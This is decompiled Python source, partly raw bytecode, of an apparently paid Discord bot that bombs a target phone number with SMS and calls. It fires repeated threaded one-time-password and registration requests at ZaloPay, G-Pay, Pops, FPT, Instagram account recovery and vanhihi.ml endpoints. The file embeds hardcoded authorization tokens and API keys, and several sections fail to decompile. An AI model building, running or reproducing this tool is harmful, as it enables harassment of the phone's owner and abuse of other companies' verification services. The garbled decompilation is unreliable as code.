               52  LOAD_STR                 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
               54  MAP_ADD               1  ''
               56  LOAD_STR                 'sec-ch-ua-platform'
               58  LOAD_STR                 '"Linux"'
               60  MAP_ADD               1  ''
               62  LOAD_STR                 'accept'
               64  LOAD_STR                 '*/*'
               66  MAP_ADD               1  ''
               68  LOAD_STR                 'origin'
               70  LOAD_STR                 'https://online.f88.vn'
               72  MAP_ADD               1  ''
               74  LOAD_STR                 'sec-fetch-site'
               76  LOAD_STR                 'same-site'
               78  MAP_ADD               1  ''
               80  LOAD_STR                 'sec-fetch-mode'
               82  LOAD_STR                 'cors'
               84  MAP_ADD               1  ''
               86  LOAD_STR                 'sec-fetch-dest'
               88  LOAD_STR                 'empty'
               90  MAP_ADD               1  ''
               92  LOAD_STR                 'referer'
               94  LOAD_STR                 'https://online.f88.vn/'
               96  MAP_ADD               1  ''
               98  LOAD_STR                 'accept-encoding'
              100  LOAD_STR                 'gzip, deflate, br'
              102  MAP_ADD               1  ''
              104  LOAD_STR                 '0'
              106  LOAD_FAST                'phone'
              108  BINARY_ADD       
              110  LOAD_STR                 '03ANYolqvEe93MY94VJjkvDUIsq6ysACNy1tsnG1xnFq9YLY1gyez-_QvS0YEsxe9D0ddnuXKmlrbWqvT3KTQD2Bhx9yLeQ6M-nzUChGrqS08GEhHIdCpl3JLvHctZYeX18O8qZqcHY-e7qHq1WG7kkPbykyx9KwxMDnzW3j1N0KymuMti1Z0WAUgXHDh-ifJvI3n4lp5Tzsq5k1Nswugf0X3HFexHAm9GACImJIDG46QRucLBRm0df6jfazibClJyKlLXdvnqmrjCt6Wy22C_h-RY9Iilj5Lcy9rawUShIMJoCFX08UOWP_llCE4T5h5kuUk1llSgu9pdHMK2T6OuEROwXt2begTITv-9l534brGibKVlwwbxLtfHWohLRYQC-tjYWWq7avFLPOA9d53_72KLKoYAuKjvqKul683bQ7HtEzZ-eK3VCiBQj1Za1EV3R69e648tCkNkGXr9kpr1n0ccGeNbXSuB3GHQQGPnDIGuYgalvKa77_iX68OQ90PouP2GeT_RvBY3'
              112  LOAD_STR                 'Online'
              114  LOAD_CONST               ('phoneNumber', 'recaptchaResponse', 'source')
              116  BUILD_CONST_KEY_MAP_3     3 
              118  LOAD_CONST               ('headers', 'json')
              120  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              122  LOAD_ATTR                text
              124  POP_TOP          

Parse error at or near `None' instruction at offset -1


def cang8(phone):
    requests.get(f"http://vanhihi.ml/sms2.php?sdt=0{phone}").text


def cang9(phone):
    requests.get(f"http://vanhihi.ml/sms3.php?sdt=0{phone}").text


def cang10(phone):
    requests.get(f"http://vanhihi.ml/sms4.php?sdt=0{phone}").text


def cang11(phone):
    requests.get(f"http://vanhihi.ml/sms5.php?sdt=0{phone}").text


def cang12(phone):
    requests.get(f"http://vanhihi.ml/sms6.php?sdt=0{phone}").text


def cang13(phone):
    requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data=f"email_or_username=0{phone}&recaptcha_challenge_field=", headers={ 'Content-Type': "'application/x-www-form-urlencoded'",  'X-Requested-With': "'XMLHttpRequest'", 
      'User-Agent': "'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36'", 
      'x-csrftoken': "'EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD'"}).json


def cang14(phone):
    requests.get(f"https://tettrungthu.vn/get-otp?phone={phone}&utmstring=?utm_content=942119&utm_medium=Ni1uCKf1MAx2OJ1E8WOEKLm1uCBCX0WXiJzLloWIm1pcn0XZ&utm_source=accesstrade&aff_sid=Ni1uCKf1MAx2OJ1E8WOEKLm1uCBCX0WXiJzLloWIm1pcn0XZ&atnct1=b06f50d1f89bd8b2a0fb771c1a69c2b0&atnct2=Ni1uCKf1MAx2OJ1E8WOEKLm1uCBCX0WXiJzLloWIm1pcn0XZ&atnct3=WgRDa000c5q00k6xz").text


def cang15--- This code section failed: ---

 L. 190         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                post
                4  LOAD_STR                 'https://products.popsww.com/api/v5/auths/register'
                6  BUILD_MAP_0           0 
                8  LOAD_STR                 'Host'
               10  LOAD_STR                 'products.popsww.com'
               12  MAP_ADD               1  ''
               14  LOAD_STR                 'content-length'
               16  LOAD_STR                 '89'
               18  MAP_ADD               1  ''
               20  LOAD_STR                 'profileid'
               22  LOAD_STR                 '62e58a27c6f857005396318f'
               24  MAP_ADD               1  ''
               26  LOAD_STR                 'sec-ch-ua-mobile'
               28  LOAD_STR                 '?1'
               30  MAP_ADD               1  ''
               32  LOAD_STR                 'authorization'
               34  LOAD_STR                 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InI1aTZqN3dUTERBS3hMV3lZcDdaM2ZnUUJKNWk3U2tmRkJHR2tNNUlCSlYycFdiRDNwbVd1MUM2eTQyVHJRaUIiLCJ1c2VySWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGUiLCJyb2xlcyI6WyJHVUVTVCJdLCJwcm9maWxlcyI6W3siaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGYiLCJhZ2UiOjEzLCJtcGFhIjp7ImlkIjoiNWQyM2UxMjU5NTI1MWI5OGJkMDQzMzc2IiwiYWdlIjoxM319LHsiaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOTAiLCJhZ2UiOjcsIm1wYWEiOnsiaWQiOiI1ZDIzZTFlMjk1MjUxYjk4YmQwNDM0MWQiLCJhZ2UiOjd9fV0sImlhdCI6MTY1OTIxMDI3OSwiZXhwIjoxOTc0NTcwMjc5fQ.3exZEvv0YG1Uw0UYx2Mt9Oj3NhRb8BX-l4tIAcVv9gw'
               36  MAP_ADD               1  ''
               38  LOAD_STR                 'x-env'
               40  LOAD_STR                 'production'
               42  MAP_ADD               1  ''
               44  LOAD_STR                 'content-type'
               46  LOAD_STR                 'application/json'
               48  MAP_ADD               1  ''
               50  LOAD_STR                 'lang'
               52  LOAD_STR                 'vi'
               54  MAP_ADD               1  ''
               56  LOAD_STR                 'sub-api-version'
               58  LOAD_STR                 '1.1'
               60  MAP_ADD               1  ''
               62  LOAD_STR                 'user-agent'
               64  LOAD_STR                 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
               66  MAP_ADD               1  ''
               68  LOAD_STR                 'api-key'
               70  LOAD_STR                 '5d2300c2c69d24a09cf5b09b'
               72  MAP_ADD               1  ''
               74  LOAD_STR                 'platform'
               76  LOAD_STR                 'wap'
               78  MAP_ADD               1  ''
               80  LOAD_STR                 'sec-ch-ua-platform'
               82  LOAD_STR                 '"Linux"'
               84  MAP_ADD               1  ''
               86  LOAD_STR                 'accept'
               88  LOAD_STR                 '*/*'
               90  MAP_ADD               1  ''
               92  LOAD_STR                 'origin'
               94  LOAD_STR                 'https://pops.vn'
               96  MAP_ADD               1  ''
               98  LOAD_STR                 'sec-fetch-site'
              100  LOAD_STR                 'cross-site'
              102  MAP_ADD               1  ''
              104  LOAD_STR                 'sec-fetch-mode'
              106  LOAD_STR                 'cors'
              108  MAP_ADD               1  ''
              110  LOAD_STR                 'empty'
              112  LOAD_STR                 'https://pops.vn/auth/signin-signup/signup?isOffSelectProfile=true'
              114  LOAD_STR                 'gzip, deflate, br'
              116  LOAD_CONST               ('sec-fetch-dest', 'referer', 'accept-encoding')
              118  BUILD_CONST_KEY_MAP_3     3 
              120  <165>                 1  ''
              122  LOAD_GLOBAL              json
              124  LOAD_METHOD              dumps
              126  LOAD_STR                 ''
              128  LOAD_STR                 '0'
              130  LOAD_FAST                'phone'
              132  BINARY_ADD       
              134  LOAD_STR                 'Abcxaxgh'
              136  LOAD_STR                 'Abcxaxgh'
              138  LOAD_CONST               ('fullName', 'account', 'password', 'confirmPassword')
              140  BUILD_CONST_KEY_MAP_4     4 
              142  CALL_METHOD_1         1  ''
              144  LOAD_CONST               ('headers', 'data')
              146  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
              148  LOAD_ATTR                text
              150  POP_TOP          

Parse error at or near `None' instruction at offset -1


def cang16(phone):
    headers = {
      'Host': "'api.zalopay.vn'", 
      'x-user-agent': "'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1'", 
      'x-device-model': "'iPhone8,2'", 
      'x-density': "'iphone3x'", 
      'authorization': "'Bearer '", 
      'x-device-os': "'IOS'", 
      'x-drsite': "'off'", 
      'accept': "'*/*'", 
      'x-app-version': "'7.13.1'", 
      'accept-language': "'vi-VN;q=1.0, en-VN;q=0.9'", 
      'user-agent': "'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2'", 
      'x-platform': "'NATIVE'", 
      'x-os-version': "'14.6'"}
    params = {'phone_number': '0' + phone}
    token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
    json_data = {'phone_number':'0' + phone, 
     'send_otp_token':token}
    response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text


def cang17(phone):
    response = requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json={'phone_number':f"0{phone}",  'hash':self.random_string(40)}).json()['meta']['msg']


def CBot(phone, amount):
    for i in range(amount):
        threading.submit(cang5, phone)


def DBot(phone, amount):
    for i in range(amount):
        threading.submit(cang01, phone)
        sleep(7)
        threading.submit(cang02, phone)
        sleep(7)
        threading.submit(cang4, phone)


def BBot(phone, amount):
    for i in range(amount):
        threading.submit(cang01, phone)
        threading.submit(cang02, phone)
        threading.submit(cang03, phone)
        threading.submit(cang1, phone)
        threading.submit(cang2, phone)
        threading.submit(cang3, phone)
        threading.submit(cang3, phone)
        threading.submit(cang4, phone)
        threading.submit(cang5, phone)
        threading.submit(cang6, phone)
        threading.submit(cang7, phone)
        threading.submit(cang8, phone)
        threading.submit(cang9, phone)
        threading.submit(cang10, phone)
        threading.submit(cang11, phone)
        threading.submit(cang12, phone)
        threading.submit(cang13, phone)
        threading.submit(cang14, phone)
        threading.submit(cang15, phone)
        threading.submit(cang16, phone)
        threading.submit(cang17, phone)


@commands.has_role('vip buy')
@bot.event
async def on_connect--- This code section failed: ---

 L. 300         0  <129>                 1  ''

 L. 172         2  LOAD_GLOBAL              os
                4  LOAD_METHOD              system
                6  LOAD_STR                 'clear'
                8  CALL_METHOD_1         1  ''
               10  POP_TOP          

 L. 175        12  LOAD_GLOBAL              print
               14  LOAD_STR                 'Connecting Bot User : '
               16  LOAD_GLOBAL              bot
               18  LOAD_ATTR                user
               20  FORMAT_VALUE          0  ''
               22  BUILD_STRING_2        2 
               24  CALL_FUNCTION_1       1  ''
               26  POP_TOP          

 L. 176        28  LOAD_GLOBAL              time
               30  LOAD_METHOD              sleep
               32  LOAD_CONST               1.0
               34  CALL_METHOD_1         1  ''
               36  POP_TOP          

 L. 177        38  LOAD_GLOBAL              print
               40  LOAD_STR                 'Bot Is Online Now !!!'
               42  CALL_FUNCTION_1       1  ''
               44  POP_TOP          

Parse error at or near `None' instruction at offset -1


@commands.has_role('vip buy')
@bot.command()
async def fpt--- This code section failed: ---

 L. 323         0  <129>                 1  ''

 L. 195         2  LOAD_FAST                'amount'
                4  LOAD_CONST               101
                6  COMPARE_OP               <
                8  POP_JUMP_IF_FALSE   109  'to 109'

 L. 198        10  LOAD_GLOBAL              discord
               12  LOAD_ATTR                Embed
               14  LOAD_CONST               u'\U0001f680 *\U0001d649\U0001d65c\U0001d66a\U0001d66e\U0001d65a\u0302\u0303\U0001d663 \U0001d653\U0001d66a\U0001d656\u0302\U0001d663 \U0001d64f\U0001d667\U0001d66a\u031b\U0001d664\u031b\u0300\U0001d663\U0001d65c* \U0001f680'
               16  LOAD_GLOBAL              discord
               18  LOAD_ATTR                Colour
               20  LOAD_METHOD              random
               22  CALL_METHOD_0         0  ''
               24  LOAD_CONST               ('title', 'color')
               26  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               28  STORE_FAST               'emsent'

 L. 199        30  BUILD_LIST_0          0 
               32  LOAD_CONST               ('https://media.giphy.com/media/ID6InsM2kfNcjfjifc/giphy.gif', 'https://media.giphy.com/media/PmrIUPmLaxA6lI3LHX/giphy.gif', 'https://media.giphy.com/media/QmQnNSOhORmhSSokdJ/giphy.gif', 'https://media.giphy.com/media/YWMZIfHgO9ccMznfXL/giphy.gif', 'https://media.giphy.com/media/YWMZIfHgO9ccMznfXL/giphy.gif', 'https://media.giphy.com/media/aFzdrzrT7MNr0KzWNq/giphy.gif', 'https://media.giphy.com/media/4xDkKQY6e1tlZBABRh/giphy.gif', 'https://media.giphy.com/media/06fQENAy0AFH7GSDUp/giphy.gif')
               34  CALL_FINALLY         37  'to 37'
               36  STORE_FAST               'gn'

 L. 200        38  LOAD_GLOBAL              random
               40  LOAD_METHOD              choice
               42  LOAD_FAST                'gn'
               44  CALL_METHOD_1         1  ''
               46  STORE_FAST               'gnrd'

 L. 201        48  LOAD_FAST                'emsent'
               50  LOAD_ATTR                set_thumbnail
               52  LOAD_FAST                'gnrd'
               54  LOAD_CONST               ('url',)
               56  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               58  POP_TOP          

 L. 202        60  LOAD_FAST                'emsent'
               62  LOAD_ATTR                add_field
               64  LOAD_STR                 '**TARGET**'
               66  LOAD_STR                 '```0'
               68  LOAD_FAST                'phone'
               70  FORMAT_VALUE          0  ''
               72  LOAD_STR                 '```'
               74  BUILD_STRING_3        3 
               76  LOAD_CONST               ('name', 'value')
               78  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               80  POP_TOP          

 L. 203        82  LOAD_FAST                'emsent'
               84  LOAD_ATTR                add_field
               86  LOAD_STR                 '**TYPE**'
               88  LOAD_STR                 '```FPT Sms```'
               90  LOAD_CONST               ('name', 'value')
               92  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               94  POP_TOP          

 L. 204        96  LOAD_FAST                'emsent'
               98  LOAD_ATTR                add_field
              100  LOAD_STR                 '**AMOUNT**'
              102  LOAD_STR                 '```'
              104  LOAD_FAST                'amount'
              106  FORMAT_VALUE          0  ''
              108  LOAD_STR                 '```'
              110  BUILD_STRING_3        3 
              112  LOAD_CONST               ('name', 'value')
              114  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              116  POP_TOP          

 L. 205       118  LOAD_FAST                'emsent'
              120  LOAD_ATTR                add_field
              122  LOAD_STR                 '**STATUS**'
              124  LOAD_STR                 '```Success```'
              126  LOAD_CONST               ('name', 'value')
              128  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              130  POP_TOP          

 L. 206       132  BUILD_LIST_0          0 
              134  LOAD_CONST               ('https://media.giphy.com/media/v6VWVHLsu34p0IH3RP/giphy.gif', 'https://media.giphy.com/media/mP1ohhP1qcBeZSHCf6/giphy.gif', 'https://media.giphy.com/media/6jUaX1Jd2Xrbffw9Gu/giphy.gif', 'https://media.giphy.com/media/jz62qtaMLe4xTiOO3L/giphy.gif', 'https://media.giphy.com/media/Aug3566Gn8DKFD1aZy/giphy.gif', 'https://media.giphy.com/media/vfSr2UMdz9pGTVqxaT/giphy.gif', 'https://media.giphy.com/media/E8hb9k7LvSCcHqwlxP/giphy.gif', 'https://media.giphy.com/media/GhOYgvCWeNUUUrGNoW/giphy.gif', 'https://media.giphy.com/media/STJKDPDiEQAW7BPXxp/giphy.gif', 'https://media.giphy.com/media/ItKyU9yIWI5MfpCZmI/giphy.gif')
              136  CALL_FINALLY        139  'to 139'
              138  STORE_FAST               'ca'

 L. 207       140  LOAD_GLOBAL              random
              142  LOAD_METHOD              choice
              144  LOAD_FAST                'ca'
              146  CALL_METHOD_1         1  ''
              148  STORE_FAST               'rd1'

 L. 208       150  LOAD_FAST                'emsent'
              152  LOAD_ATTR                set_image
              154  LOAD_FAST                'rd1'
              156  LOAD_CONST               ('url',)
              158  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              160  POP_TOP          

 L. 209       162  LOAD_FAST                'emsent'
              164  LOAD_ATTR                set_footer
              166  LOAD_CONST               u'\xa9 Developer : Tr\u01b0\u1eddng#0001 | Request By '
              168  LOAD_FAST                'ctx'
              170  LOAD_ATTR                author
              172  LOAD_ATTR                name
              174  FORMAT_VALUE          0  ''
              176  BUILD_STRING_2        2 
              178  LOAD_CONST               ('text',)
              180  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              182  POP_TOP          

 L. 210       184  LOAD_FAST                'ctx'
              186  LOAD_ATTR                channel
              188  LOAD_ATTR                send
              190  LOAD_FAST                'emsent'
              192  LOAD_CONST               ('embed',)
              194  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              196  GET_AWAITABLE    
              198  LOAD_CONST               None
              200  YIELD_FROM       
              202  POP_TOP          

 L. 213       204  LOAD_GLOBAL              CBot
              206  LOAD_FAST                'phone'
              208  LOAD_FAST                'amount'
              210  CALL_FUNCTION_2       2  ''
              212  POP_TOP          
              214  LOAD_CONST               None
              216  RETURN_VALUE     

 L. 215       218  LOAD_GLOBAL              discord
              220  LOAD_ATTR                Embed
              222  LOAD_CONST               u'\U0001f680 *\U0001d649\U0001d65c\U0001d66a\U0001d66e\U0001d65a\u0302\u0303\U0001d663 \U0001d653\U0001d66a\U0001d656\u0302\U0001d663 \U0001d64f\U0001d667\U0001d66a\u031b\U0001d664\u031b\u0300\U0001d663\U0001d65c* \U0001f680'
              224  LOAD_CONST               16711680
              226  LOAD_CONST               ('title', 'color')
              228  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              230  STORE_FAST               'embentd'

 L. 217       232  LOAD_FAST                'embentd'
              234  LOAD_ATTR                add_field
              236  LOAD_STR                 '**WARNING**'
              238  LOAD_CONST               u'`Spam Max 100 Th\xf4i Nh\xe9 !!!`'
              240  LOAD_CONST               ('name', 'value')
              242  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              244  POP_TOP          

 L. 218       246  LOAD_FAST                'embentd'
              248  LOAD_ATTR                set_footer
              250  LOAD_CONST               u' \xa9 Developer : Tr\u01b0\u1eddng#0001 | Warning '
              252  LOAD_FAST                'ctx'
              254  LOAD_ATTR                author
              256  LOAD_ATTR                name
              258  FORMAT_VALUE          0  ''
              260  LOAD_STR                 ' !!!'
              262  BUILD_STRING_3        3 
              264  LOAD_CONST               ('text',)
              266  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              268  POP_TOP          

 L. 219       270  LOAD_FAST                'ctx'
              272  LOAD_ATTR                reply
              274  LOAD_FAST                'embentd'
              276  LOAD_CONST               ('embed',)
              278  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              280  GET_AWAITABLE    
              282  LOAD_CONST               None
              284  YIELD_FROM       
              286  POP_TOP          

Parse error at or near `None' instruction at offset -1


@commands.has_role('vip buy')
@bot.command()
async def call--- This code section failed: ---

 L. 352         0  <129>                 1  ''

 L. 224         2  LOAD_FAST                'amount'
                4  LOAD_CONST               2
                6  COMPARE_OP               <
                8  POP_JUMP_IF_FALSE   109  'to 109'

 L. 227        10  LOAD_GLOBAL              discord
               12  LOAD_ATTR                Embed
               14  LOAD_CONST               u'\U0001f680 *\U0001d649\U0001d65c\U0001d66a\U0001d66e\U0001d65a\u0302\u0303\U0001d663 \U0001d653\U0001d66a\U0001d656\u0302\U0001d663 \U0001d64f\U0001d667\U0001d66a\u031b\U0001d664\u031b\u0300\U0001d663\U0001d65c* \U0001f680'
               16  LOAD_GLOBAL              discord
               18  LOAD_ATTR                Colour
               20  LOAD_METHOD              random
               22  CALL_METHOD_0         0  ''
               24  LOAD_CONST               ('title', 'color')
               26  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               28  STORE_FAST               'emsend'

 L. 228        30  BUILD_LIST_0          0 
               32  LOAD_CONST               ('https://media.giphy.com/media/ID6InsM2kfNcjfjifc/giphy.gif', 'https://media.giphy.com/media/PmrIUPmLaxA6lI3LHX/giphy.gif', 'https://media.giphy.com/media/QmQnNSOhORmhSSokdJ/giphy.gif', 'https://media.giphy.com/media/YWMZIfHgO9ccMznfXL/giphy.gif', 'https://media.giphy.com/media/YWMZIfHgO9ccMznfXL/giphy.gif', 'https://media.giphy.com/media/aFzdrzrT7MNr0KzWNq/giphy.gif', 'https://media.giphy.com/media/4xDkKQY6e1tlZBABRh/giphy.gif', 'https://media.giphy.com/media/06fQENAy0AFH7GSDUp/giphy.gif')
               34  CALL_FINALLY         37  'to 37'
               36  STORE_FAST               'gn'

 L. 229        38  LOAD_GLOBAL              random
               40  LOAD_METHOD              choice
               42  LOAD_FAST                'gn'
               44  CALL_METHOD_1         1  ''
               46  STORE_FAST               'gnrd'

 L. 230        48  LOAD_FAST                'emsend'
               50  LOAD_ATTR                set_thumbnail
               52  LOAD_FAST                'gnrd'
               54  LOAD_CONST               ('url',)
               56  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               58  POP_TOP          

 L. 231        60  LOAD_FAST                'emsend'
               62  LOAD_ATTR                add_field
               64  LOAD_STR                 '**TARGET**'
               66  LOAD_STR                 '```0'
               68  LOAD_FAST                'phone'
               70  FORMAT_VALUE          0  ''
               72  LOAD_STR                 '```'
               74  BUILD_STRING_3        3 
               76  LOAD_CONST               ('name', 'value')
               78  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               80  POP_TOP          

 L. 232        82  LOAD_FAST                'emsend'
               84  LOAD_ATTR                add_field
               86  LOAD_STR                 '**TYPE**'
               88  LOAD_STR                 '```CALL BETA```'
               90  LOAD_CONST               ('name', 'value')
               92  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               94  POP_TOP          

 L. 233        96  LOAD_FAST                'emsend'
               98  LOAD_ATTR                add_field
              100  LOAD_STR                 '**AMOUNT**'
              102  LOAD_STR                 '```'
              104  LOAD_FAST                'amount'
              106  FORMAT_VALUE          0  ''
              108  LOAD_STR                 '```'
              110  BUILD_STRING_3        3 
              112  LOAD_CONST               ('name', 'value')
              114  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              116  POP_TOP          

 L. 234       118  LOAD_FAST                'emsend'
              120  LOAD_ATTR                add_field
              122  LOAD_STR                 '**STATUS**'
              124  LOAD_STR                 '```Success```'
              126  LOAD_CONST               ('name', 'value')
              128  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              130  POP_TOP          

 L. 235       132  BUILD_LIST_0          0 
              134  LOAD_CONST               ('https://media.giphy.com/media/v6VWVHLsu34p0IH3RP/giphy.gif', 'https://media.giphy.com/media/mP1ohhP1qcBeZSHCf6/giphy.gif', 'https://media.giphy.com/media/6jUaX1Jd2Xrbffw9Gu/giphy.gif', 'https://media.giphy.com/media/jz62qtaMLe4xTiOO3L/giphy.gif', 'https://media.giphy.com/media/Aug3566Gn8DKFD1aZy/giphy.gif', 'https://media.giphy.com/media/vfSr2UMdz9pGTVqxaT/giphy.gif', 'https://media.giphy.com/media/E8hb9k7LvSCcHqwlxP/giphy.gif', 'https://media.giphy.com/media/GhOYgvCWeNUUUrGNoW/giphy.gif', 'https://media.giphy.com/media/STJKDPDiEQAW7BPXxp/giphy.gif', 'https://media.giphy.com/media/ItKyU9yIWI5MfpCZmI/giphy.gif')
              136  CALL_FINALLY        139  'to 139'
              138  STORE_FAST               'ca'

 L. 236       140  LOAD_GLOBAL              random
              142  LOAD_METHOD              choice
              144  LOAD_FAST                'ca'
              146  CALL_METHOD_1         1  ''
              148  STORE_FAST               'rd1'

 L. 237       150  LOAD_FAST                'emsend'
              152  LOAD_ATTR                set_image
              154  LOAD_FAST                'rd1'
              156  LOAD_CONST               ('url',)
              158  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              160  POP_TOP          

 L. 238       162  LOAD_FAST                'emsend'
              164  LOAD_ATTR                set_footer
              166  LOAD_CONST               u'\xa9 Developer : Tr\u01b0\u1eddng#0001 | Requests By '
              168  LOAD_FAST                'ctx'
              170  LOAD_ATTR                author
              172  LOAD_ATTR                name
              174  FORMAT_VALUE          0  ''
              176  BUILD_STRING_2        2 
              178  LOAD_CONST               ('text',)
              180  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              182  POP_TOP          

 L. 239       184  LOAD_FAST                'ctx'
              186  LOAD_ATTR                channel
              188  LOAD_ATTR                send
              190  LOAD_FAST                'emsend'
              192  LOAD_CONST               ('embed',)
              194  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              196  GET_AWAITABLE    
              198  LOAD_CONST               None
              200  YIELD_FROM       
              202  POP_TOP          

 L. 241       204  LOAD_GLOBAL              DBot
              206  LOAD_FAST                'phone'
              208  LOAD_FAST                'amount'
              210  CALL_FUNCTION_2       2  ''
              212  POP_TOP          
              214  LOAD_CONST               None
              216  RETURN_VALUE     

 L. 243       218  LOAD_GLOBAL              discord
              220  LOAD_ATTR                Embed
              222  LOAD_CONST               u'\U0001f680 *\U0001d649\U0001d65c\U0001d66a\U0001d66e\U0001d65a\u0302\u0303\U0001d663 \U0001d653\U0001d66a\U0001d656\u0302\U0001d663 \U0001d64f\U0001d667\U0001d66a\u031b\U0001d664\u031b\u0300\U0001d663\U0001d65c* \U0001f680'
              224  LOAD_CONST               16711680
              226  LOAD_CONST               ('title', 'color')
              228  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              230  STORE_FAST               'embentd'

 L. 245       232  LOAD_FAST                'embentd'
              234  LOAD_ATTR                add_field
              236  LOAD_STR                 '**WARNING**'
              238  LOAD_CONST               u'`Spam Max 1 Th\xf4i Nh\xe9 !!!`'
              240  LOAD_CONST               ('name', 'value')
              242  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              244  POP_TOP          

 L. 246       246  LOAD_FAST                'embentd'
              248  LOAD_ATTR                set_footer
              250  LOAD_CONST               u'\xa9 Developer : Tr\u01b0\u1eddng#0001 | Warning '
              252  LOAD_FAST                'ctx'
              254  LOAD_ATTR                author
              256  LOAD_ATTR                name
              258  FORMAT_VALUE          0  ''
              260  LOAD_STR                 ' !!!'
              262  BUILD_STRING_3        3 
              264  LOAD_CONST               ('text',)
              266  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              268  POP_TOP          

 L. 247       270  LOAD_FAST                'ctx'
              272  LOAD_ATTR                reply
              274  LOAD_FAST                'embentd'
              276  LOAD_CONST               ('embed',)
              278  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              280  GET_AWAITABLE    
              282  LOAD_CONST               None
              284  YIELD_FROM       
              286  POP_TOP          

Parse error at or near `None' instruction at offset -1


@commands.has_role('vip buy')
@bot.command()
async def sms--- This code section failed: ---

 L. 381         0  <129>                 1  ''

 L. 253         2  LOAD_FAST                'amount'
                4  LOAD_CONST               101
                6  COMPARE_OP               <
                8  POP_JUMP_IF_FALSE   109  'to 109'

 L. 256        10  LOAD_GLOBAL              discord
               12  LOAD_ATTR                Embed
               14  LOAD_CONST               u'\U0001f680 *\U0001d649\U0001d65c\U0001d66a\U0001d66e\U0001d65a\u0302\u0303\U0001d663 \U0001d653\U0001d66a\U0001d656\u0302\U0001d663 \U0001d64f\U0001d667\U0001d66a\u031b\U0001d664\u031b\u0300\U0001d663\U0001d65c* \U0001f680'
               16  LOAD_GLOBAL              discord
               18  LOAD_ATTR                Colour
               20  LOAD_METHOD              random
               22  CALL_METHOD_0         0  ''
               24  LOAD_CONST               ('title', 'color')
               26  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               28  STORE_FAST               'embes'

 L. 257        30  BUILD_LIST_0          0 
               32  LOAD_CONST               ('https://media.giphy.com/media/ID6InsM2kfNcjfjifc/giphy.gif', 'https://media.giphy.com/media/PmrIUPmLaxA6lI3LHX/giphy.gif', 'https://media.giphy.com/media/QmQnNSOhORmhSSokdJ/giphy.gif', 'https://media.giphy.com/media/YWMZIfHgO9ccMznfXL/giphy.gif', 'https://media.giphy.com/media/YWMZIfHgO9ccMznfXL/giphy.gif', 'https://media.giphy.com/media/aFzdrzrT7MNr0KzWNq/giphy.gif', 'https://media.giphy.com/media/4xDkKQY6e1tlZBABRh/giphy.gif', 'https://media.giphy.com/media/06fQENAy0AFH7GSDUp/giphy.gif')
               34  CALL_FINALLY         37  'to 37'
               36  STORE_FAST               'gn'

 L. 258        38  LOAD_GLOBAL              random
               40  LOAD_METHOD              choice
               42  LOAD_FAST                'gn'
               44  CALL_METHOD_1         1  ''
               46  STORE_FAST               'gnrd'

 L. 259        48  LOAD_FAST                'embes'
               50  LOAD_ATTR                set_thumbnail
               52  LOAD_FAST                'gnrd'
               54  LOAD_CONST               ('url',)
               56  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               58  POP_TOP          

 L. 260        60  LOAD_FAST                'embes'
               62  LOAD_ATTR                add_field
               64  LOAD_STR                 '**TARGET**'
               66  LOAD_STR                 '```0'
               68  LOAD_FAST                'phone'
               70  FORMAT_VALUE          0  ''
               72  LOAD_STR                 '```'
               74  BUILD_STRING_3        3 
               76  LOAD_CONST               ('name', 'value')
               78  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               80  POP_TOP          

 L. 261        82  LOAD_FAST                'embes'
               84  LOAD_ATTR                add_field
               86  LOAD_STR                 '**AMOUNT**'
